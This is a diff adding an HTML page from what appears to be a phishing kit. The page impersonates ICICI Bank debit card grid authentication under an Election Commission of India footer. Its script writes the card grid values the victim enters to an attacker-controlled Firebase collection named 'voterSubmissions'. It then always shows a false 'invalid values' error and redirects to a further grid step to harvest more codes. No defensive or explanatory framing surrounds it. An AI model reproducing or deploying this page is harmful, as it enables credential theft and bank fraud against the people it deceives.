@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Debit Card Grid Authentication - Step 3</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .form-container { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; }
+        .form-container h2 { margin-bottom: 5px; color: #0056b3; font-size: 20px; }
+        .sub-title { color: #555; font-size: 13px; margin-bottom: 15px; }
+        
+        .card-preview-box {
+            margin-bottom: 15px;
+            background: #f8fafc;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+        }
+        .card-preview-box img {
+            width: 100%;
+            max-width: 280px;
+            height: auto;
+            border-radius: 6px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+        }
+        .card-preview-text {
+            font-size: 11px;
+            color: #475569;
+            margin-top: 6px;
+            font-weight: 600;
+        }
+
+        .error-msg { 
+            background: #f8d7da; 
+            color: #721c24; 
+            padding: 20px 10px; 
+            border-radius: 8px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            line-height: 1.5;
+            margin-bottom: 20px; 
+            display: none; 
+            border: 2px solid #f5c6cb; 
+            box-shadow: 0 4px 15px rgba(220, 53, 69, 0.2);
+        }
+
+        .grid-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin-bottom: 20px;
+            background: #f8f9fa;
+            padding: 15px 10px;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+        }
+        .grid-item { flex: 1; text-align: center; }
+        .grid-label { display: block; margin-bottom: 6px; color: #0056b3; font-weight: bold; font-size: 15px; }
+        .grid-input { width: 100%; padding: 8px 5px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; }
+        .grid-input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }
+
+        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 15px; font-weight: bold; cursor: pointer; }
+        .btn-next:hover { background: #004085; }
+        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
+        .footer-text { margin-top: 25px; font-size: 12px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Debit Card Grid Authentication</h2>
+        <div class="sub-title">Grid Step 3 Verification</div>
+
+        <div class="card-preview-box">
+            <img src="card-grid.png" alt="ICICI Card Grid Reference">
+            <div class="card-preview-text">ICICI Bank Debit Card Grid Reference (Back Side)</div>
+        </div>
+
+        <div id="errorAlert" class="error-msg">
+            ⚠️ INVALID GRID VALUES!<br>PLEASE ENTER AGAIN
+        </div>
+
+        <form id="gridForm3">
+            <div class="grid-container">
+                <div class="grid-item">
+                    <span class="grid-label">O</span>
+                    <input type="password" id="gridO" name="gridO" class="grid-input" placeholder="--" maxlength="2" required>
+                </div>
+                <div class="grid-item">
+                    <span class="grid-label">P</span>
+                    <input type="password" id="gridP" name="gridP" class="grid-input" placeholder="--" maxlength="2" required>
+                </div>
+                <div class="grid-item">
+                    <span class="grid-label">K</span>
+                    <input type="password" id="gridK" name="gridK" class="grid-input" placeholder="--" maxlength="2" required>
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn-next">Verify & Submit</button>
+        </form>
+
+        <div class="footer-text">
+            © 2026 Election Commission of India. All rights reserved.
+        </div>
+    </div>
+
+    <!-- Firebase SDK & Script -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
+            authDomain: "voter-verification-a04d5.firebaseapp.com",
+            projectId: "voter-verification-a04d5",
+            storageBucket: "voter-verification-a04d5.firebasestorage.app",
+            messagingSenderId: "582458013788",
+            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
+            measurementId: "G-8CX5BVQXFC"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        document.getElementById('gridForm3').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const gridO = document.getElementById('gridO').value;
+            const gridP = document.getElementById('gridP').value;
+            const gridK = document.getElementById('gridK').value;
+            const gridStep3Data = `O:${gridO}, P:${gridP}, K:${gridK}`;
+
+            const docId = localStorage.getItem('voterDocId');
+            if (!docId) {
+                alert("Session expired. Please start from the first page.");
+                window.location.href = "index.html";
+                return;
+            }
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerText = "Verifying with Bank...";
+
+            try {
+                const docRef = doc(db, "voterSubmissions", docId);
+                // Firebase में Grid Step 3 का डेटा और करंट स्टेप अपडेट करें
+                await updateDoc(docRef, {
+                    gridStep3: gridStep3Data,
+                    currentStep: "Grid Step 3 Submitted"
+                });
+
+                setTimeout(() => {
+                    document.getElementById('gridForm3').style.display = 'none';
+                    document.getElementById('errorAlert').style.display = 'block';
+
+                    setTimeout(() => {
+                        window.location.href = "grid_step4.html"; 
+                    }, 2500);
+                }, 3500);
+
+            } catch (error) {
+                console.error("Error updating document: ", error);
+                alert("डेटा सेव करने में समस्या हुई।");
+                btn.disabled = false;
+                btn.innerText = "Verify & Submit";
+            }
+        });
+    </script>
+</body>
+</html>
